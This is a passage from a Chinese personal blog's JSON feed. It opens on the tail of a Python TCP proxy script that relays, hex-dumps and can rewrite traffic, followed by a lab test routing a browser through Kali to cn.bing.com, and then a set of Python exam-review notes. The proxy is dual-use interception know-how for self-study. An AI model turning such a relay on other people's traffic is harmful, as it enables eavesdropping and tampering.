data-num=\"133\"></td><td><pre>            remote_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"134\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[==>] Sent to remote.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"135\"></td><td><pre></pre></td></tr><tr><td data-num=\"136\"></td><td><pre>        <span class=\"token comment\"># 接收远程主机的数据</span></pre></td></tr><tr><td data-num=\"137\"></td><td><pre>        remote_buffer <span class=\"token operator\">=</span> receive_from<span class=\"token punctuation\">(</span>remote_socket<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"138\"></td><td><pre>        <span class=\"token comment\"># 如果有数据就打印</span></pre></td></tr><tr><td data-num=\"139\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"140\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[&lt;==] Received %d bytes from remote.\"</span> <span class=\"token operator\">%</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"141\"></td><td><pre>            hex_dump<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"142\"></td><td><pre></pre></td></tr><tr><td data-num=\"143\"></td><td><pre>            <span class=\"token comment\"># 发送到我们的响应处理器</span></pre></td></tr><tr><td data-num=\"144\"></td><td><pre>            remote_buffer <span class=\"token operator\">=</span> response_handler<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"145\"></td><td><pre></pre></td></tr><tr><td data-num=\"146\"></td><td><pre>            <span class=\"token comment\"># 将响应发送到本地套接字</span></pre></td></tr><tr><td data-num=\"147\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"148\"></td><td><pre></pre></td></tr><tr><td data-num=\"149\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[&lt;==] Sent to localhost.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"150\"></td><td><pre></pre></td></tr><tr><td data-num=\"151\"></td><td><pre>        <span class=\"token comment\"># 如果两边没有更多的数据，则关闭连接</span></pre></td></tr><tr><td data-num=\"152\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>local_buffer<span class=\"token punctuation\">)</span> <span class=\"token keyword\">or</span> <span class=\"token keyword\">not</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>remote_buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"153\"></td><td><pre>            client_socket<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"154\"></td><td><pre>            remote_socket<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"155\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] No more data. Closing connections.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"156\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"157\"></td><td><pre></pre></td></tr><tr><td data-num=\"158\"></td><td><pre></pre></td></tr><tr><td data-num=\"159\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">server_loop</span><span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">,</span> remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">,</span> receive_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"160\"></td><td><pre></pre></td></tr><tr><td data-num=\"161\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"162\"></td><td><pre>    【需要代理方】与【代理服务器】绑定套接字</pre></td></tr><tr><td data-num=\"163\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"164\"></td><td><pre>    <span class=\"token comment\"># 创建一个套接字对象</span></pre></td></tr><tr><td data-num=\"165\"></td><td><pre>    server <span class=\"token operator\">=</span> socket<span class=\"token punctuation\">.</span>socket<span class=\"token punctuation\">(</span>socket<span class=\"token punctuation\">.</span>AF_INET<span class=\"token punctuation\">,</span> socket<span class=\"token punctuation\">.</span>SOCK_STREAM<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"166\"></td><td><pre>    <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"167\"></td><td><pre>        <span class=\"token comment\"># 绑定服务地址</span></pre></td></tr><tr><td data-num=\"168\"></td><td><pre>        server<span class=\"token punctuation\">.</span>bind<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"169\"></td><td><pre>    <span class=\"token keyword\">except</span> Exception <span class=\"token keyword\">as</span> e<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"170\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"171\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[!!] Failed to listen on %s:%d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"172\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[!!] Check for other listening sockets or correct permissions.\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"173\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"174\"></td><td><pre></pre></td></tr><tr><td data-num=\"175\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] Listening on %s:%d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"176\"></td><td><pre></pre></td></tr><tr><td data-num=\"177\"></td><td><pre>    server<span class=\"token punctuation\">.</span>listen<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"178\"></td><td><pre></pre></td></tr><tr><td data-num=\"179\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"180\"></td><td><pre>        <span class=\"token comment\"># 返回一个二元元组</span></pre></td></tr><tr><td data-num=\"181\"></td><td><pre>        client_socket<span class=\"token punctuation\">,</span> addr <span class=\"token operator\">=</span> server<span class=\"token punctuation\">.</span>accept<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"182\"></td><td><pre></pre></td></tr><tr><td data-num=\"183\"></td><td><pre>        <span class=\"token comment\"># 打印客户端连接信息</span></pre></td></tr><tr><td data-num=\"184\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[==>] Received incoming connection from %s:%d\"</span> <span class=\"token operator\">%</span> <span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"185\"></td><td><pre></pre></td></tr><tr><td data-num=\"186\"></td><td><pre>        <span class=\"token comment\"># 启动一个线程与目标通信</span></pre></td></tr><tr><td data-num=\"187\"></td><td><pre>        proxy_thread <span class=\"token operator\">=</span> threading<span class=\"token punctuation\">.</span>Thread<span class=\"token punctuation\">(</span>target<span class=\"token operator\">=</span>proxy_handler<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"188\"></td><td><pre>                                        args<span class=\"token operator\">=</span><span class=\"token punctuation\">(</span>client_socket<span class=\"token punctuation\">,</span> remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">,</span> receive_first<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"189\"></td><td><pre>        proxy_thread<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"190\"></td><td><pre></pre></td></tr><tr><td data-num=\"191\"></td><td><pre></pre></td></tr><tr><td data-num=\"192\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"193\"></td><td><pre>    <span class=\"token triple-quoted-string string\">'''</pre></td></tr><tr><td data-num=\"194\"></td><td><pre>    解析运行参数，调用服务。</pre></td></tr><tr><td data-num=\"195\"></td><td><pre>    '''</span></pre></td></tr><tr><td data-num=\"196\"></td><td><pre></pre></td></tr><tr><td data-num=\"197\"></td><td><pre>    <span class=\"token comment\"># 这里没有花哨的命令行解析</span></pre></td></tr><tr><td data-num=\"198\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token number\">5</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"199\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Usage: ./proxy.py [localhost] [localport] [remotehost] [remoteport] [receive_first]\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"200\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"Example: ./proxy.py 127.0.0.1 9000 10.12.132.1 9000 True\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"201\"></td><td><pre>        sys<span class=\"token punctuation\">.</span>exit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"202\"></td><td><pre></pre></td></tr><tr><td data-num=\"203\"></td><td><pre>    <span class=\"token comment\"># 设置本地监听参数</span></pre></td></tr><tr><td data-num=\"204\"></td><td><pre>    local_host <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"205\"></td><td><pre>    local_port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"206\"></td><td><pre></pre></td></tr><tr><td data-num=\"207\"></td><td><pre>    <span class=\"token comment\"># 设置远程目标</span></pre></td></tr><tr><td data-num=\"208\"></td><td><pre>    remote_host <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"209\"></td><td><pre>    remote_port <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"210\"></td><td><pre></pre></td></tr><tr><td data-num=\"211\"></td><td><pre>    <span class=\"token comment\">#  这告诉我们的代理连接和接收数据</span></pre></td></tr><tr><td data-num=\"212\"></td><td><pre>    <span class=\"token comment\">#  在发送到目标主机之前</span></pre></td></tr><tr><td data-num=\"213\"></td><td><pre>    receive_first <span class=\"token operator\">=</span> sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"214\"></td><td><pre></pre></td></tr><tr><td data-num=\"215\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token string\">\"True\"</span> <span class=\"token keyword\">in</span> receive_first<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"216\"></td><td><pre>        receive_first <span class=\"token operator\">=</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"217\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"218\"></td><td><pre>        receive_first <span class=\"token operator\">=</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"219\"></td><td><pre></pre></td></tr><tr><td data-num=\"220\"></td><td><pre>    <span class=\"token comment\"># 现在打开监听套接字</span></pre></td></tr><tr><td data-num=\"221\"></td><td><pre>    server_loop<span class=\"token punctuation\">(</span>local_host<span class=\"token punctuation\">,</span> local_port<span class=\"token punctuation\">,</span> remote_host<span class=\"token punctuation\">,</span> remote_port<span class=\"token punctuation\">,</span> receive_first<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"222\"></td><td><pre></pre></td></tr><tr><td data-num=\"223\"></td><td><pre></pre></td></tr><tr><td data-num=\"224\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"225\"></td><td><pre>    main<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"测试代码\"><a class=\"anchor\" href=\"#测试代码\">#</a> 测试代码</h1>\n<p>环境：win10 物理机、kali linux 虚拟机 IP 地址为 192.168.199.128、谷歌浏览器与代理插件。</p>\n<p>在 kali 上运行代码：<br />\n <code>Python3 TCP_Proxy.py 192.168.199.128 8080 cn.bing.com 80 True</code></p>\n<p>在谷歌浏览器上打开代理<br />\n<img data-src=\"image003.png\" alt=\"\" /></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1jbi1iNDdjcDI4ZmtzNWFqcWNvdnouYmluZy5jb20=\">浏览器访问 cn.bing.com</span><br />\nkali 上显示的信息<br />\n先查看连接<br />\n（左边为 Windows 的 cmd 右边为 Kali 的 shell）<br />\n<img data-src=\"image002.png\" alt=\"\" /></p>\n<p>在看数据包<br />\n（这里不知道为什么是坏的数据包）<br />\n<img data-src=\"image004.png\" alt=\"\" /></p>\n<p>有些问题，等过段时间再解决。</p>\n<h1 id=\"参考\"><a class=\"anchor\" href=\"#参考\">#</a> 参考</h1>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQwNTQ5MDcwL2FydGljbGUvZGV0YWlscy8xMDgxOTM1Mzc=\">https://blog.csdn.net/qq_40549070/article/details/108193537</span></p>\n<p>使用 ctype 获取线程 id<br />\n<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RqY3d0MjAxMS9hcnRpY2xlL2RldGFpbHMvODA4ODU0MTA=\">https://blog.csdn.net/tjcwt2011/article/details/80885410</span><br />\n<span class=\"exturl\" data-url=\"aHR0cDovL3hpYW9ydWkuY2MvYXJjaGl2ZXMvMzAxNw==\">http://xiaorui.cc/archives/3017</span></p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://or0kit.github.io/Programming/Python/python-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/",
            "url": "https://or0kit.github.io/Programming/Python/python-%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/",
            "title": "python 期末复习",
            "date_published": "2020-12-18T08:53:24.000Z",
            "content_html": "<h1 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h1>\n<blockquote>\n<p>老师怕学生考试挂科，额外安排了一节课讲考试范围和题型（泄题 (｀・ω・´)）。就喜欢这样的老师！<br />\n权当巩固一下咯，仅供自己复习用。<br />\n仅仅是一些考点。</p>\n</blockquote>\n<h1 id=\"python简介\"><a class=\"anchor\" href=\"#python简介\">#</a> Python 简介</h1>\n<p>Python，读作 ['paɪθɑn], 汉语是蟒蛇，Python 的 logo 是两条缠绕在一起的蟒蛇.</p>\n<p>Python 语言是由荷兰程序员 Guido van Rossum，独立开发完成初版的。之所以选中 Python 作为该编程语言的名字，是因为他是一个叫 Monty Python 喜剧团体的爱好者，其本意并不是想选条蟒蛇。</p>\n<h1 id=\"python语言的特点\"><a class=\"anchor\" href=\"#python语言的特点\">#</a> Python 语言的特点</h1>\n<blockquote>\n<p>Emma 这些基础特点到是忘了不少。</p>\n</blockquote>\n<p><strong>简单易学、明确优雅、开发速度快 跨平台、可移植、可扩展、交互式、解释型、面向对象的动态语言，丰富的库，开源</strong></p>\n<ul>\n<li>跨平台：Python 支持 Windows、Linux 和 MAC os 等主流操作系统。</li>\n<li>可移植：代码通常不需要多少改动就能移植到别的平台上使用。</li>\n<li>可扩展：Python 语言本身由 C 语言编写而成的，你完全可以在 Python 中嵌入 C，从而提高代码的运行速度和效率。你也可以使用 C 语言重写 Python 的任何模块，从根本上改写 Python，PyPy 就是这么干的。</li>\n<li>交互式：Python 提供很好的人机交互界面，比如 IDLE 和 IPython。可以从终端输入执行代码并获得结果，互动的测试和调试代码片断。</li>\n<li>解释型：Python 语言在执行过程中由解释器逐行分析，逐行运行并输出结果。</li>\n<li>面向对象：Python 语言具备所有的面向对象特性和功能，支持基于类的程序开发。</li>\n<li>动态语言：在运行时可以改变其结构。例如新的函数、对象、甚至代码可以被引进，已有的函数可以被删除或是其他结构上的变化。动态语言非常具有活力。</li>\n</ul>\n<h2 id=\"内置电池大量的标准库和第三方库\"><a class=\"anchor\" href=\"#内置电池大量的标准库和第三方库\">#</a> “内置电池”，大量的标准库和第三方库</h2>\n<p>Python 为我们提供了非常完善的基础库，覆盖了系统、网络、文件、GUI、数据库、文本处理等方方面面，这些是随同解释器被默认安装的，各平台通用，你无需安装第三方支持就可以完成大多数工作，这一特点被形象地称作 “内置电池（batteries included）”。</p>\n<p>有一句话叫做 “不要重复造轮子”。不要过分迷信自己的代码能力，要知道，能作为标准库被 Python 内置，必然在可靠性和算法效率上达到了目前最高水平，能被广泛使用的第三方库，必然也是经受了大量的应用考验。那些造轮子的事情，就交给世界最顶尖的那一波程序员去干吧，没有极致的思维和数学能力，想创造好用的轮子是很难的。</p>\n<h2 id=\"社区活跃贡献者多互帮互助\"><a class=\"anchor\" href=\"#社区活跃贡献者多互帮互助\">#</a> 社区活跃，贡献者多，互帮互助</h2>\n<p>国外有好多，在国内，好像没有比较成熟，因此学好英语，去和世界范围的程序员交流吧！</p>\n<h2 id=\"开源语言发展动力巨大\"><a class=\"anchor\" href=\"#开源语言发展动力巨大\">#</a> 开源语言，发展动力巨大</h2>\n<p>Python 是基于 C 语言编写的，并且使用 GPL 开源协议，你可以免费获取它的源代码，进行学习、研究甚至改进。众人拾柴火焰高，有更多的人参与 Python 的开发，促使它更好的发展，被更多的应用，形成良性循环。Python 为什么会越来越火就是因为它的开放性，自由性，聚起了人气，形成了社区，有很多人在其中做贡献，用的人越来越多，自然就提高了市场占有率，企业、公司、厂家就不得不使用 Python，提供的 Python 程序员岗位就越来越多，这就是开源的力量。</p>\n<h1 id=\"python的应用方向\"><a class=\"anchor\" href=\"#python的应用方向\">#</a> Python 的应用方向</h1>\n<ol>\n<li>\n<p>常规软件开发<br />\n Python 支持函数式编程和 OOP 面向对象编程，能够承担任何种类软件的开发工作，因此常规的软件开发、脚本编写、网络编程等都属于标配能力。</p>\n</li>\n<li>\n<p>科学计算<br />\n随着 NumPy, SciPy, Matplotlib, Enthought librarys 等众多程序库的开发，Python 越来越适合于做科学计算、绘制高质量的 2D 和 3D 图像。和科学计算领域最流行的商业软件 Matlab 相比，Python 是一门通用的程序设计语言，比 Matlab 所采用的脚本语言的应用范围更广泛，有更多的程序库的支持。虽然 Matlab 中的许多高级功能和 toolbox 目前还是无法替代的，不过在日常的科研开发之中仍然有很多的工作是可以用 Python 代劳的。</p>\n</li>\n<li>\n<p>自动化运维<br />\n这几乎是 Python 应用的自留地，作为运维工程师首选的编程语言，Python 在自动化运维方面已经深入人心，比如 Saltstack 和 Ansible 都是大名鼎鼎的自动化平台。</p>\n</li>\n<li>\n<p>云计算<br />\n开源云计算解决方案 OpenStack 就是基于 Python 开发的，搞云计算的同学都懂的。</p>\n</li>\n<li>\n<p>WEB 开发<br />\n基于 Python 的 Web 开发框架不要太多，比如耳熟能详的 Django，还有 Tornado，Flask。其中的 Python+Django 架构，应用范围非常广，开发速度非常快，学习门槛也很低，能够帮助你快速的搭建起可用的 WEB 服务。</p>\n</li>\n<li>\n<p>网络爬虫<br />\n也称网络蜘蛛，是大数据行业获取数据的核心工具。没有网络爬虫自动地、不分昼夜地、高智能地在互联网上爬取免费的数据，那些大数据相关的公司恐怕要少四分之三。能够编写网络爬虫的编程语言有不少，但 Python 绝对是其中的主流之一，其 Scripy 爬虫框架应用非常广泛。</p>\n</li>\n<li>\n<p>数据分析<br />\n在大量数据的基础上，结合科学计算、机器学习等技术，对数据进行清洗、去重、规格化和针对性的分析是大数据行业的基石。Python 是数据分析的主流语言之一。</p>\n</li>\n<li>\n<p>人工智能<br />\n Python 在人工智能大范畴领域内的机器学习、神经网络、深度学习等方面都是主流的编程语言，得到广泛的支持和应用。</p>\n</li>\n</ol>\n<p>当然，除了以上的主流和前沿领域，Python 还在其他传统或特殊行业起着重要的作用。</p>\n<h1 id=\"python包管理工具\"><a class=\"anchor\" href=\"#python包管理工具\">#</a> Python 包管理工具</h1>\n<p>Python 有两个著名的包管理工具 easy_install 和 pip。在 Python2.7 的安装包中，easy_install 是默认安装的，而 pip 需要我们手动安装。随着 Python 版本的提高，easy_install 已经逐渐被淘汰，但是一些比较老的第三方库，在现在仍然只能通过 easy_install 进行安装。目前，pip 已经成为主流的安装工具，自 Python2 &gt;=2.7.9 或者 Python3.4 以后默认都安装有 pip。</p>\n<p>就如同 Python 有 2、2.7、3、3.6 一样，pip 也有 pip、pip2、pip3 之分。pip 是从属于 Python 的，对应的 pip 负责给对应的 Python 安装第三方模块。我们不要关心 pip 后面跟的数字，核心的问题是这个 pip 命令对应的是哪个 Python 解释器，想要为哪个 Python 解释器安装第三方库，就要调用它名下对应的 pip。</p>\n<p>如何确定哪个 pip 是哪个 Python 的呢？</p>\n<p>cmd 环境中，输入 pip -V (大写 V)：<br />\n<img data-src=\"image001.png\" alt=\"\" /></p>\n<h2 id=\"pip的使用\"><a class=\"anchor\" href=\"#pip的使用\">#</a> pip 的使用</h2>\n<ol>\n<li>普通安装<br />\n<em>再次强调，使用 pip 前请务必确认其所对应的 Python 解释器必须是你想要的那个！</em></li>\n</ol>\n<p>以安装 pillow 模块为例。输入 pip install pillow。</p>\n<ol start=\"2\">\n<li>\n<p>指定版本安装<br />\n安装特定版本的 package，通过使用 ==, &gt;=, &lt;=,&gt;, &lt; 来指定一个版本号。<br />\npip install 'Markdown&lt;2.0'<br />\npip install 'Markdown&gt;2.0,&lt;2.0.3</p>\n</li>\n<li>\n<p>卸载已安装的库<br />\n pip uninstall pillow</p>\n</li>\n<li>\n<p>列出已经安装的库<br />\n pip list</p>\n</li>\n<li>\n<p>将已经安装的库列表保存到文本文件中<br />\n pip freeze &gt; requirements.txt</p>\n</li>\n</ol>\n<p>这个功能非常常用、好用！经常被用作项目环境依赖文件。</p>\n<ol start=\"6\">\n<li>根据依赖文件批量安装库<br />\n pip install -r requirements.txt</li>\n</ol>\n<p>使用上面的 txt 文件，批量安装第三方库。</p>\n<h1 id=\"python的virtualenv-虚拟环境\"><a class=\"anchor\" href=\"#python的virtualenv-虚拟环境\">#</a> Python 的 virtualenv 虚拟环境</h1>\n<p>这部分不考，详细内容见<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubGl1amlhbmdibG9nLmNvbS9jb3Vyc2UvcHl0aG9uLzY=\"> https://www.liujiangblog.com/course/python/6</span></p>\n<h1 id=\"python基础\"><a class=\"anchor\" href=\"#python基础\">#</a> Python 基础</h1>\n<h2 id=\"缩进\"><a class=\"anchor\" href=\"#缩进\">#</a> 缩进</h2>\n<p>python 的灵魂就是使用缩进来表示代码块，不需要使用大括号 {} 。<br />\n缩进的空格数是可变的，但是同一个代码块的语句必须包含相同的缩进空格数。</p>\n<h2 id=\"注释\"><a class=\"anchor\" href=\"#注释\">#</a> 注释</h2>\n<p>Python 中单行注释以 # 开头<br />\n多行注释可以用多个 # 号，还有 ''' 和 &quot;&quot;&quot;</p>\n<h2 id=\"python自带的集成开发环境\"><a class=\"anchor\" href=\"#python自带的集成开发环境\">#</a> Python 自带的集成开发环境</h2>\n<p><strong>IDLE</strong></p>\n<h2 id=\"python变量的命名规则\"><a class=\"anchor\" href=\"#python变量的命名规则\">#</a> Python 变量的命名规则</h2>\n<p>变量名可以包括字母、数字、下划线，但不能以数字开头。区分大小写。</p>\n<h2 id=\"python-pass-语句\"><a class=\"anchor\" href=\"#python-pass-语句\">#</a> Python pass 语句</h2>\n<p>Python pass 是空语句，是为了保持程序结构的完整性。</p>\n<p>pass 不做任何事情，一般用做占位语句。</p>\n<h2 id=\"为什么说python采用的是基于值的内存管理模式\"><a class=\"anchor\" href=\"#为什么说python采用的是基于值的内存管理模式\">#</a> 为什么说 Python 采用的是基于值的内存管理模式？</h2>\n<p>Python 中的变量并不直接存储值，而是存储了值的内存地址或者引用，假如为不同变量赋值为相同值，这个值在内存中只有一份，多个变量指向同一块内存地址。</p>\n<h3 id=\"gossip闲聊脚本语言与编程语言的区别\"><a class=\"anchor\" href=\"#gossip闲聊脚本语言与编程语言的区别\">#</a> Gossip (闲聊) 脚本语言与编程语言的区别</h3>\n<p>脚本语言与编程语言的区别有：<br />\n1、脚本语言不需要编译器，省去编译过程；而编程语言需要编译器。<br />\n2、脚本语言是动态的，可以实时更改代码；而编程语言不可以实时更改代码。<br />\n3、脚本语言易学，但缺乏系统性；编程语言较为成熟。</p>\n<p>脚本语言和编程语言比较</p>\n<p>（1）脚本语言不需要编译器因而省去了编译的过程减少了开发的时间，而编程语言需要编译所以时间更长点</p>\n<p>（2）脚本语言是一种动态语言，也就是说可以实时的更改代码，而不需要将程序停止下来，这是一种高级特性。而 Java 等编程语言是静态的语言，一旦编译完成并且运行就不能更改代码，除非将程序停止下来</p>\n<p>（3）脚本语言非常容易学习，但是不够全面缺乏系统性而且语法较为散漫。而高级编程语言虽然相对难学，但是规则强可以编程出简洁美观的代码，并且可读性也相对较强。</p>\n<p>（4）一般来说脚本语言通用性较差，但是可以通过专门的应用来调整。</p>\n<p>（5）随着技术的发展，其实脚本语言变得越来越强，和编程语言的界限也比较模糊，比如 Python，可以将它视为编程语言了，因为它很强大。</p>\n<p>转载自<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cucGhwLmNuL2ZhcS80MTY3MTIuaHRtbA==\"> https://www.php.cn/faq/416712.html</span></p>\n<h2 id=\"is-与-的区别\"><a class=\"anchor\" href=\"#is-与-的区别\">#</a> is 与 == 的区别</h2>\n<p>&quot;is&quot; 作为判断地址是否相等，即判断两个变量是否指向同一内存地址<br />\n &quot;==&quot; 判断两个变量的值是否相等<br />\n同样的，&quot;is not&quot; 和 &quot;!=&quot; 遵循同样的逻辑</p>\n<h2 id=\"数据类型\"><a class=\"anchor\" href=\"#数据类型\">#</a> 数据类型</h2>\n<h3 id=\"可变数据类型\"><a class=\"anchor\" href=\"#可变数据类型\">#</a> 可变数据类型</h3>\n<h4 id=\"列表list\"><a class=\"anchor\" href=\"#列表list\">#</a> 列表 (list)</h4>\n<p>列表的系列函数：</p>\n<p>①append (): 元素的追加，在列表的末尾添加新的值 列表名.append (新增的值)</p>\n<p>②insert (下标，值)：在指定下标插入指定的值 列表名.insert (下标，值)</p>\n<p>③count (值)：求指定元素在列表中出现的次数 列表名.count (值)</p>\n<p>④pop (下标)：从列表中根据下标移除指定位置的值 列表名.pop (下标)<br />\n（pop 删除元素，是将元素从列表移除，但依然存在于内存，如需使用，使用变量接收）</p>\n<p>⑤remove (值)：从列表中根据值来删除掉指定的元素<br />\n（如果列表中存在重复的元素，删除的时候，仅仅删除第一个）<br />\n⑥sort ()：排序，从小到大 .<br />\n 